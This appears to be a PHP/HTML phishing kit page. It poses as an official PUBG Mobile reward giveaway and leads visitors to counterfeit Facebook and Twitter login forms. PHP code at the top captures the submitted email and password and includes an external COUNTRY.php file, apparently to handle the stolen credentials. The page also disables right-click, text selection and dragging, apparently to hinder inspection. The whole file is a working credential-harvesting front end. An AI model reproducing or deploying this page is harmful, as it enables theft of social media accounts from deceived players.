<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['email'];
$password = $_POST['password'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div> <!--- navbar-btn-wrapper --->
<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>OFFICIAL PUBG ON MOBILE</span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<img src="img/header.jpg">
</div> <!--- slider --->
</div> <!--- header --->
<div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">PUBG MOBILE</div>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="menu-change">
This latest reward will expire in time
<button type="button" id="latestTimer"></button>
</div> <!--- menu-change --->
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/1.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_account_login(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_account_login(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_account_login(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</div> <!--- box --->
<div class="footer">
<img src="img/footer_img.png">
<div class="footer-txt">&copy; 2018-2024 PUBG CORPORATION. All rights reserved.</div>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<a onmousedown="tutup.play();" onclick="close_reward_confirmation()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div>
<div class="popup-alert">Are you sure to collect this reward?</div>
<img class="popup-item" src="" id="myRewardImg">
<button type="button" onmousedown="buka.play();" class="popup-btn" onclick="open_account_login()">Collect</button>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<a onmousedown="tutup.play();" onclick="close_account_login()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Account Login</div></div>
<div class="popup-alert">Log in using your PUBG MOBILE account to receive reward</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter icon-login"></i> Log in using Twitter account</button>
</div>
</div>

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="img/login/facebook_text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form class="login-form" action="" method="post">
				<label>
				<input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
				</label>
				<label>
				<input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				</label>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">English (US)</div>
			<div class="language-name">Español</div>
			<div class="language-name">नेपाली</div>
			<div class="language-name">日本語</div>
			<div class="language-name">தமிழ்</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="img/login/twitter_text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/timer.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>